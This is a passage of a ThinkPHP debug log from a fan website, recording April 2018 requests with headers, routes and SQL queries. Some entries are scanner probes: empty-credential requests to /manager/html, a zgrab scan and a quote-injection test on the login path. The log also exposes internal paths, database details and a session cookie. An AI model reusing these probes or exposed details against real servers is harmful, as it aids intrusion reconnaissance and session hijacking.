[ 2018-04-14T00:35:52+08:00 ] 172.16.0.5 124.114.203.174 GET /manager/html
[ log ] 123.207.34.110:80/manager/html [运行时间：0.012086s][吞吐率：82.74req/s] [内存消耗：1,356.20kb] [文件加载：40]
[ info ] [ LANG ] /home/www/WWW/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'manager',
    1 => 'html',
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'authorization' => 'Basic Og==',
  'host' => '123.207.34.110:80',
  'user-agent' => 'Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; WOW64; Trident/6.0)',
  'accept' => 'text/html, application/xhtml+xml, */*',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2018-04-14T01:42:17+08:00 ] 172.16.0.5 112.90.82.196 GET /ccvv
[ log ] 123.207.34.110/ccvv [运行时间：0.013496s][吞吐率：74.10req/s] [内存消耗：1,356.69kb] [文件加载：40]
[ info ] [ LANG ] /home/www/WWW/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'ccvv',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'connection' => 'Close',
  'user-agent' => 'Mozilla/5.0 (iPhone; CPU iPhone OS 9_3_4 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Mobile/13G35 QQ/6.5.3.410 V1_IPH_SQ_6.5.3_1_APP_A Pixel/750 Core/UIWebView NetType/2G Mem/117',
  'accept-language' => 'zh-cn',
  'accept' => '*/*',
  'accept-encoding' => 'deflate, gzip',
  'host' => '123.207.34.110',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2018-04-14T01:44:12+08:00 ] 172.16.0.5 47.93.90.175 GET /
[ log ] 111.231.51.99:8000/ [运行时间：0.013712s][吞吐率：72.93req/s] [内存消耗：1,677.87kb] [文件加载：46]
[ info ] [ LANG ] /home/www/WWW/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'accept-encoding' => 'identity',
  'connection' => 'Close',
  'host' => '111.231.51.99:8000',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ RUN ] app\index\controller\Index->index[ /home/www/WWW/application/index/controller/Index.php ]
[ info ] [ VIEW ] /home/www/WWW/public/../application/index/view/index/index.html [ array (
  0 => 'audio',
) ]
[ info ] [ SESSION ] INIT array (
  'id' => '',
  'var_session_id' => '',
  'prefix' => 'think',
  'type' => '',
  'auto_start' => true,
)
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2018-04-14T01:52:32+08:00 ] 172.16.0.5 163.177.90.152 GET /
[ log ] www.zard-forever.com/ [运行时间：0.015035s][吞吐率：66.51req/s] [内存消耗：1,679.10kb] [文件加载：46]
[ info ] [ LANG ] /home/www/WWW/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'connection' => 'Close',
  'user-agent' => 'Mozilla/5.0 (iPhone; CPU iPhone OS 9_3_4 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Mobile/13G35 QQ/6.5.3.410 V1_IPH_SQ_6.5.3_1_APP_A Pixel/750 Core/UIWebView NetType/2G Mem/117',
  'accept-language' => 'zh-cn',
  'accept' => '*/*',
  'accept-encoding' => 'deflate, gzip',
  'host' => 'www.zard-forever.com',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ RUN ] app\index\controller\Index->index[ /home/www/WWW/application/index/controller/Index.php ]
[ info ] [ VIEW ] /home/www/WWW/public/../application/index/view/index/index.html [ array (
  0 => 'audio',
) ]
[ info ] [ SESSION ] INIT array (
  'id' => '',
  'var_session_id' => '',
  'prefix' => 'think',
  'type' => '',
  'auto_start' => true,
)
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2018-04-14T01:59:02+08:00 ] 172.16.0.5 222.186.171.75 GET /manager/html
[ log ] 123.207.34.110:80/manager/html [运行时间：0.011969s][吞吐率：83.55req/s] [内存消耗：1,356.20kb] [文件加载：40]
[ info ] [ LANG ] /home/www/WWW/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'manager',
    1 => 'html',
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'authorization' => 'Basic Og==',
  'host' => '123.207.34.110:80',
  'user-agent' => 'Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; WOW64; Trident/6.0)',
  'accept' => 'text/html, application/xhtml+xml, */*',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2018-04-14T02:52:19+08:00 ] 172.16.0.5 183.57.53.196 GET /
[ log ] 123.207.34.110/ [运行时间：0.014690s][吞吐率：68.07req/s] [内存消耗：1,679.08kb] [文件加载：46]
[ info ] [ LANG ] /home/www/WWW/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'connection' => 'Close',
  'user-agent' => 'Mozilla/5.0 (iPhone; CPU iPhone OS 9_3_4 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Mobile/13G35 QQ/6.5.3.410 V1_IPH_SQ_6.5.3_1_APP_A Pixel/750 Core/UIWebView NetType/2G Mem/117',
  'accept-language' => 'zh-cn',
  'accept' => '*/*',
  'accept-encoding' => 'deflate, gzip',
  'host' => '123.207.34.110',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ RUN ] app\index\controller\Index->index[ /home/www/WWW/application/index/controller/Index.php ]
[ info ] [ VIEW ] /home/www/WWW/public/../application/index/view/index/index.html [ array (
  0 => 'audio',
) ]
[ info ] [ SESSION ] INIT array (
  'id' => '',
  'var_session_id' => '',
  'prefix' => 'think',
  'type' => '',
  'auto_start' => true,
)
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2018-04-14T02:55:02+08:00 ] 172.16.0.5 60.191.38.78 GET /
[ log ] 123.207.34.110:80/ [运行时间：0.016388s][吞吐率：61.02req/s] [内存消耗：1,678.49kb] [文件加载：46]
[ info ] [ LANG ] /home/www/WWW/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'connection' => 'keep-alive',
  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
  'user-agent' => 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:47.0) Gecko/20100101 Firefox/47.0',
  'host' => '123.207.34.110:80',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ RUN ] app\index\controller\Index->index[ /home/www/WWW/application/index/controller/Index.php ]
[ info ] [ VIEW ] /home/www/WWW/public/../application/index/view/index/index.html [ array (
  0 => 'audio',
) ]
[ info ] [ SESSION ] INIT array (
  'id' => '',
  'var_session_id' => '',
  'prefix' => 'think',
  'type' => '',
  'auto_start' => true,
)
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2018-04-14T03:19:55+08:00 ] 172.16.0.5 40.77.167.37 GET /
[ log ] zard-forever.com/ [运行时间：0.015120s][吞吐率：66.14req/s] [内存消耗：1,680.79kb] [文件加载：46]
[ info ] [ LANG ] /home/www/WWW/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'user-agent' => 'Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)',
  'host' => 'zard-forever.com',
  'from' => 'bingbot(at)microsoft.com',
  'accept-encoding' => 'gzip, deflate',
  'accept' => '*/*',
  'pragma' => 'no-cache',
  'connection' => 'Keep-Alive',
  'cache-control' => 'no-cache',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ RUN ] app\index\controller\Index->index[ /home/www/WWW/application/index/controller/Index.php ]
[ info ] [ VIEW ] /home/www/WWW/public/../application/index/view/index/index.html [ array (
  0 => 'audio',
) ]
[ info ] [ SESSION ] INIT array (
  'id' => '',
  'var_session_id' => '',
  'prefix' => 'think',
  'type' => '',
  'auto_start' => true,
)
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2018-04-14T03:20:58+08:00 ] 172.16.0.5 123.151.42.61 GET /
[ log ] www.baidu.com/ [运行时间：0.014183s][吞吐率：70.51req/s] [内存消耗：1,678.36kb] [文件加载：46]
[ info ] [ LANG ] /home/www/WWW/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'content-length' => '0',
  'proxy-connection' => 'Keep-Alive',
  'content-type' => 'text/html',
  'accept' => '*/*',
  'host' => 'www.baidu.com',
)
[ info ] [ PARAM ] array (
)
[ info ] [ RUN ] app\index\controller\Index->index[ /home/www/WWW/application/index/controller/Index.php ]
[ info ] [ VIEW ] /home/www/WWW/public/../application/index/view/index/index.html [ array (
  0 => 'audio',
) ]
[ info ] [ SESSION ] INIT array (
  'id' => '',
  'var_session_id' => '',
  'prefix' => 'think',
  'type' => '',
  'auto_start' => true,
)
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2018-04-14T03:38:59+08:00 ] 172.16.0.5 115.231.218.198 GET /manager/html
[ log ] 123.207.34.110:80/manager/html [运行时间：0.012810s][吞吐率：78.06req/s] [内存消耗：1,356.20kb] [文件加载：40]
[ info ] [ LANG ] /home/www/WWW/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'manager',
    1 => 'html',
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'authorization' => 'Basic Og==',
  'host' => '123.207.34.110:80',
  'user-agent' => 'Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; WOW64; Trident/6.0)',
  'accept' => 'text/html, application/xhtml+xml, */*',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2018-04-14T04:20:42+08:00 ] 172.16.0.5 40.77.167.37 GET /
[ log ] www.zard-forever.com/ [运行时间：0.014275s][吞吐率：70.05req/s] [内存消耗：1,680.79kb] [文件加载：46]
[ info ] [ LANG ] /home/www/WWW/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'user-agent' => 'Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)',
  'host' => 'www.zard-forever.com',
  'from' => 'bingbot(at)microsoft.com',
  'accept-encoding' => 'gzip, deflate',
  'accept' => '*/*',
  'pragma' => 'no-cache',
  'connection' => 'Keep-Alive',
  'cache-control' => 'no-cache',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ RUN ] app\index\controller\Index->index[ /home/www/WWW/application/index/controller/Index.php ]
[ info ] [ VIEW ] /home/www/WWW/public/../application/index/view/index/index.html [ array (
  0 => 'audio',
) ]
[ info ] [ SESSION ] INIT array (
  'id' => '',
  'var_session_id' => '',
  'prefix' => 'think',
  'type' => '',
  'auto_start' => true,
)
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2018-04-14T04:24:34+08:00 ] 172.16.0.5 183.57.53.222 GET /manager/html
[ log ] 123.207.34.110/manager/html [运行时间：0.012935s][吞吐率：77.31req/s] [内存消耗：1,356.79kb] [文件加载：40]
[ info ] [ LANG ] /home/www/WWW/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'manager',
    1 => 'html',
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'connection' => 'Close',
  'user-agent' => 'Mozilla/5.0 (iPhone; CPU iPhone OS 9_3_4 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Mobile/13G35 QQ/6.5.3.410 V1_IPH_SQ_6.5.3_1_APP_A Pixel/750 Core/UIWebView NetType/2G Mem/117',
  'accept-language' => 'zh-cn',
  'accept' => '*/*',
  'accept-encoding' => 'deflate, gzip',
  'host' => '123.207.34.110',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2018-04-14T05:56:43+08:00 ] 172.16.0.5 172.241.112.83 GET /
[ log ] zard-forever.com/ [运行时间：0.014917s][吞吐率：67.04req/s] [内存消耗：1,678.84kb] [文件加载：46]
[ info ] [ LANG ] /home/www/WWW/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'host' => 'zard-forever.com',
  'accept-language' => 'en',
  'user-agent' => 'Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)',
  'accept' => 'text/html,text/plain,text/xml,text/*,application/xml,application/xhtml+xml,application/rss+xml,application/atom+xml,application/rdf+xml,application/php,application/x-php,application/x-httpd-php',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ RUN ] app\index\controller\Index->index[ /home/www/WWW/application/index/controller/Index.php ]
[ info ] [ VIEW ] /home/www/WWW/public/../application/index/view/index/index.html [ array (
  0 => 'audio',
) ]
[ info ] [ SESSION ] INIT array (
  'id' => '',
  'var_session_id' => '',
  'prefix' => 'think',
  'type' => '',
  'auto_start' => true,
)
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2018-04-14T07:33:13+08:00 ] 172.16.0.5 35.195.24.135 GET /
[ log ] 123.207.34.110/ [运行时间：0.015345s][吞吐率：65.17req/s] [内存消耗：1,678.06kb] [文件加载：46]
[ info ] [ LANG ] /home/www/WWW/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'accept-encoding' => 'gzip',
  'accept' => '*/*',
  'user-agent' => 'Mozilla/5.0 zgrab/0.x',
  'host' => '123.207.34.110',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ RUN ] app\index\controller\Index->index[ /home/www/WWW/application/index/controller/Index.php ]
[ info ] [ VIEW ] /home/www/WWW/public/../application/index/view/index/index.html [ array (
  0 => 'audio',
) ]
[ info ] [ SESSION ] INIT array (
  'id' => '',
  'var_session_id' => '',
  'prefix' => 'think',
  'type' => '',
  'auto_start' => true,
)
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2018-04-14T09:38:15+08:00 ] 172.16.0.5 158.85.81.118 GET /
[ log ] zard-forever.com/ [运行时间：0.015348s][吞吐率：65.16req/s] [内存消耗：1,677.41kb] [文件加载：46]
[ info ] [ LANG ] /home/www/WWW/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'host' => 'zard-forever.com',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ RUN ] app\index\controller\Index->index[ /home/www/WWW/application/index/controller/Index.php ]
[ info ] [ VIEW ] /home/www/WWW/public/../application/index/view/index/index.html [ array (
  0 => 'audio',
) ]
[ info ] [ SESSION ] INIT array (
  'id' => '',
  'var_session_id' => '',
  'prefix' => 'think',
  'type' => '',
  'auto_start' => true,
)
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2018-04-14T09:39:26+08:00 ] 172.16.0.5 54.191.232.51 GET /
[ log ] zard-forever.com/ [运行时间：0.015541s][吞吐率：64.35req/s] [内存消耗：1,679.58kb] [文件加载：46]
[ info ] [ LANG ] /home/www/WWW/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'upgrade-insecure-requests' => '1',
  'connection' => 'keep-alive',
  'accept-encoding' => 'gzip, deflate',
  'accept-language' => 'en-US,en;q=0.5',
  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
  'user-agent' => 'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:55.0) Gecko/20100101 Firefox/55.0',
  'host' => 'zard-forever.com',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ RUN ] app\index\controller\Index->index[ /home/www/WWW/application/index/controller/Index.php ]
[ info ] [ VIEW ] /home/www/WWW/public/../application/index/view/index/index.html [ array (
  0 => 'audio',
) ]
[ info ] [ SESSION ] INIT array (
  'id' => '',
  'var_session_id' => '',
  'prefix' => 'think',
  'type' => '',
  'auto_start' => true,
)
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2018-04-14T09:42:33+08:00 ] 172.16.0.5 35.167.112.51 GET /index/login/login.html
[ log ] zard-forever.com/index/login/login.html [运行时间：0.126396s][吞吐率：7.91req/s] [内存消耗：1,696.55kb] [文件加载：51]
[ info ] [ LANG ] /home/www/WWW/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'index',
    1 => 'login',
    2 => 'login',
  ),
)
[ info ] [ HEADER ] array (
  'upgrade-insecure-requests' => '1',
  'connection' => 'keep-alive',
  'accept-encoding' => 'gzip, deflate',
  'accept-language' => 'en-US,en;q=0.5',
  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
  'user-agent' => 'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:51.0) Gecko/20100101 Firefox/51.0',
  'host' => 'zard-forever.com',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ SESSION ] INIT array (
  'id' => '',
  'var_session_id' => '',
  'prefix' => 'think',
  'type' => '',
  'auto_start' => true,
)
[ info ] [ RUN ] app\index\controller\Login->login[ /home/www/WWW/application/index/controller/Login.php ]
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2018-04-14T09:42:36+08:00 ] 172.16.0.5 54.190.199.3 GET /index/login/%22
[ log ] zard-forever.com/index/login/%22 [运行时间：0.016542s][吞吐率：60.45req/s] [内存消耗：1,749.34kb] [文件加载：54]
[ info ] [ LANG ] /home/www/WWW/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'index',
    1 => 'login',
    2 => '"',
  ),
)
[ info ] [ HEADER ] array (
  'upgrade-insecure-requests' => '1',
  'connection' => 'keep-alive',
  'accept-encoding' => 'gzip, deflate',
  'accept-language' => 'en-US,en;q=0.5',
  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
  'user-agent' => 'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:54.0) Gecko/20100101 Firefox/54.0',
  'host' => 'zard-forever.com',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ SESSION ] INIT array (
  'id' => '',
  'var_session_id' => '',
  'prefix' => 'think',
  'type' => '',
  'auto_start' => true,
)
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2018-04-14T09:44:32+08:00 ] 172.16.0.5 59.110.6.177 GET /
[ log ] 118.89.243.116:8000/ [运行时间：0.016594s][吞吐率：60.26req/s] [内存消耗：1,677.87kb] [文件加载：46]
[ info ] [ LANG ] /home/www/WWW/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'accept-encoding' => 'identity',
  'connection' => 'Close',
  'host' => '118.89.243.116:8000',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ RUN ] app\index\controller\Index->index[ /home/www/WWW/application/index/controller/Index.php ]
[ info ] [ VIEW ] /home/www/WWW/public/../application/index/view/index/index.html [ array (
  0 => 'audio',
) ]
[ info ] [ SESSION ] INIT array (
  'id' => '',
  'var_session_id' => '',
  'prefix' => 'think',
  'type' => '',
  'auto_start' => true,
)
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2018-04-14T09:47:22+08:00 ] 172.16.0.5 101.254.149.226 GET /manager/html
[ log ] 123.207.34.110:80/manager/html [运行时间：0.013050s][吞吐率：76.63req/s] [内存消耗：1,356.20kb] [文件加载：40]
[ info ] [ LANG ] /home/www/WWW/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'manager',
    1 => 'html',
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'authorization' => 'Basic Og==',
  'host' => '123.207.34.110:80',
  'user-agent' => 'Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; WOW64; Trident/6.0)',
  'accept' => 'text/html, application/xhtml+xml, */*',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2018-04-14T10:00:59+08:00 ] 172.16.0.5 183.250.221.201 GET /
[ log ] zard-forever.com/ [运行时间：0.014477s][吞吐率：69.08req/s] [内存消耗：1,679.67kb] [文件加载：46]
[ info ] [ LANG ] /home/www/WWW/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'connection' => 'keep-alive',
  'accept-encoding' => 'br, gzip, deflate',
  'accept-language' => 'zh-cn',
  'user-agent' => 'Mozilla/5.0 (iPhone; CPU iPhone OS 11_0 like Mac OS X) AppleWebKit/604.1.38 (KHTML, like Gecko) Mobile/15A372 baiduboxapp/10.5.0.10 (Baidu; P2 11.0)',
  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
  'hadesurlheader' => '',
  'host' => 'zard-forever.com',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ RUN ] app\index\controller\Index->index[ /home/www/WWW/application/index/controller/Index.php ]
[ info ] [ VIEW ] /home/www/WWW/public/../application/index/view/index/index.html [ array (
  0 => 'audio',
) ]
[ info ] [ SESSION ] INIT array (
  'id' => '',
  'var_session_id' => '',
  'prefix' => 'think',
  'type' => '',
  'auto_start' => true,
)
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2018-04-14T10:01:57+08:00 ] 172.16.0.5 183.250.221.201 GET /index/mv/index.html
[ log ] zard-forever.com/index/mv/index.html [运行时间：0.078370s][吞吐率：12.76req/s] [内存消耗：2,686.95kb] [文件加载：58]
[ info ] [ LANG ] /home/www/WWW/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'index',
    1 => 'mv',
    2 => 'index',
  ),
)
[ info ] [ HEADER ] array (
  'hadesurlheader' => '',
  'accept-language' => 'zh-cn',
  'referer' => 'http://zard-forever.com/',
  'user-agent' => 'Mozilla/5.0 (iPhone; CPU iPhone OS 11_0 like Mac OS X) AppleWebKit/604.1.38 (KHTML, like Gecko) Mobile/15A372 baiduboxapp/10.5.0.10 (Baidu; P2 11.0)',
  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
  'upgrade-insecure-requests' => '1',
  'connection' => 'keep-alive',
  'cookie' => 'PHPSESSID=rgm80540ts0gg53qs75tj0oq7l',
  'accept-encoding' => 'gzip, deflate',
  'host' => 'zard-forever.com',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ RUN ] app\index\controller\Mv->index[ /home/www/WWW/application/index/controller/Mv.php ]
[ info ] [ DB ] INIT mysql
[ info ] [ VIEW ] /home/www/WWW/public/../application/index/view/mv/index.html [ array (
  0 => 'nickname',
  1 => 'value',
  2 => 'data',
) ]
[ info ] [ SESSION ] INIT array (
  'id' => '',
  'var_session_id' => '',
  'prefix' => 'think',
  'type' => '',
  'auto_start' => true,
)
[ info ] [ LOG ] INIT File
[ sql ] [ DB ] CONNECT:[ UseTime:0.000258s ] mysql:dbname=zard;host=127.0.0.1;port=3306;charset=utf8
[ sql ] [ SQL ] SHOW COLUMNS FROM `mv` [ RunTime:0.000602s ]
[ sql ] [ SQL ] SELECT COUNT(*) AS tp_count FROM `mv` WHERE  `outer_address` <> ''  AND `type` = 0 LIMIT 1 [ RunTime:0.000162s ]
[ sql ] [ SQL ] SELECT * FROM `mv` WHERE  `outer_address` <> ''  AND `type` = 0 ORDER BY `id` LIMIT 0,20 [ RunTime:0.000165s ]

---------------------------------------------------------------
[ 2018-04-14T10:02:13+08:00 ] 172.16.0.5 183.250.221.201 GET /index/mv/index.html?value=3
[ log ] zard-forever.com/index/mv/index.html?value=3 [运行时间：0.023062s][吞吐率：43.36req/s] [内存消耗：2,687.86kb] [文件加载：58]
[ info ] [ LANG ] /home/www/WWW/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'index',
    1 => 'mv',
    2 => 'index',
  ),
)
[ info ] [ HEADER ] array (
  'hadesurlheader' => '',
  'accept-language' => 'zh-cn',
  'referer' => 'http://zard-forever.com/index/mv/index.html',
  'user-agent' => 'Mozilla/5.0 (iPhone; CPU iPhone OS 11_0 like Mac OS X) AppleWebKit/604.1.38 (KHTML, like Gecko) Mobile/15A372 baiduboxapp/10.5.0.10 (Baidu; P2 11.0)',
  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
  'upgrade-insecure-requests' => '1',
  'connection' => 'keep-alive',
  'cookie' => 'PHPSESSID=rgm80540ts0gg53qs75tj0oq7l',
  'accept-encoding' => 'gzip, deflate',
  'host' => 'zard-forever.com',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
  'value' => '3',
)
[ info ] [ RUN ] app\index\controller\Mv->index[ /home/www/WWW/application/index/controller/Mv.php ]
[ info ] [ DB ] INIT mysql
[ info ] [ VIEW ] /home/www/WWW/public/../application/index/view/mv/index.html [ array (
  0 => 'value',
  1 => 'nickname',
  2 => 'data',
) ]
[ info ] [ SESSION ] INIT array (
  'id' => '',
  'var_session_id' => '',
  'prefix' => 'think',
  'type' => '',
  'auto_start' => true,
)
[ info ] [ LOG ] INIT File
[ sql ] [ DB ] CONNECT:[ UseTime:0.000262s ] mysql:dbname=zard;host=127.0.0.1;port=3306;charset=utf8
[ sql ] [ SQL ] SHOW COLUMNS FROM `mv` [ RunTime:0.000578s ]
[ sql ] [ SQL ] SELECT COUNT(*) AS tp_count FROM `mv` WHERE  `outer_address` <> ''  AND `type` = 3 LIMIT 1 [ RunTime:0.000148s ]
[ sql ] [ SQL ] SELECT * FROM `mv` WHERE  `outer_address` <> ''  AND `type` = 3 ORDER BY `id` LIMIT 0,20 [ RunTime:0.000152s ]

---------------------------------------------------------------
[ 2018-04-14T10:02:17+08:00 ] 172.16.0.5 183.250.221.201 GET /index/mv/index.html?value=1
[ log ] zard-forever.com/index/mv/index.html?value=1 [运行时间：0.024904s][吞吐率：40.15req/s] [内存消耗：2,672.19kb] [文件加载：58]
[ info ] [ LANG ] /home/www/WWW/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'index',
    1 => 'mv',
    2 => 'index',
  ),
)
[ info ] [ HEADER ] array (
  'hadesurlheader' => '',
  'accept-language' => 'zh-cn',
  'referer' => 'http://zard-forever.com/index/mv/index.html?value=3',
  'user-agent' => 'Mozilla/5.0 (iPhone; CPU iPhone OS 11_0 like Mac OS X) AppleWebKit/604.1.38 (KHTML, like Gecko) Mobile/15A372 baiduboxapp/10.5.0.10 (Baidu; P2 11.0)',
  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
  'upgrade-insecure-requests' => '1',
  'connection' => 'keep-alive',
  'cookie' => 'PHPSESSID=rgm80540ts0gg53qs75tj0oq7l',
  'accept-encoding' => 'gzip, deflate',
  'host' => 'zard-forever.com',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
  'value' => '1',
)
[ info ] [ RUN ] app\index\controller\Mv->index[ /home/www/WWW/application/index/controller/Mv.php ]
[ info ] [ DB ] INIT mysql
[ info ] [ VIEW ] /home/www/WWW/public/../application/index/view/mv/index.html [ array (
